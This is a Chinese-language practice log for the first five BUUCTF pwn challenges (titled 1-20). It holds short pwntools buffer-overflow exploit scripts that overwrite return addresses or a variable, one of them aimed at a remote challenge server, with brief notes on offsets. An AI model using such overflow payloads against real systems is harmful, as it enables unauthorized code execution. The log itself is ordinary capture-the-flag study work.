# buuctf刷题记录（1-20题）

## 1 test_nc

略

## 2 rip

```python
from pwn import *
p = process('./pwn1')
p.sendline(b'a'*0xF+b'b'*0x8+p64(0x40118a))
p.interactive()
```

## 3 warmup_csaw_2016

```python
from pwn import *
#p = process('./pwn')
p = remote('node5.buuoj.cn',28694)
payload = b'a'*72+p64(0x40060d)
p.sendline(payload)
p.interactive()
```

在本地打了半天以为我有问题，最后想起来system执行的是cat flag，不会有shell

## 4 ciscn_2019_n_1

两种思路，一种是覆盖返回地址，一种是覆盖v2

```python
from pwn import *
p = process('./pwn')
retaddr=0x4006BE
payload=b'a'*56+p32(retaddr)
p.sendline(payload)
p.interactive()
```

```python
from pwn import *
p = process('./pwn')
payload = b'a'*0x2c+p64(0x41348000)	# 可以看ida里面，有写v2的偏移
p.sendline(payload)
p.interactive()
```

## 5 pwn1_sctf_2016

限制了32字节的读入，但是后面的操作会把I变为you，留4字节给esp，输入20个I就行

```python
from pwn import *
p = process('./pwn')
payload = b'I'*20+b'a'*4+p32(0x8048F0D)
p.sendline(payload)
p.interactive()
```

*这次学好了，先在本地创建了一个`flag.txt`的文件*

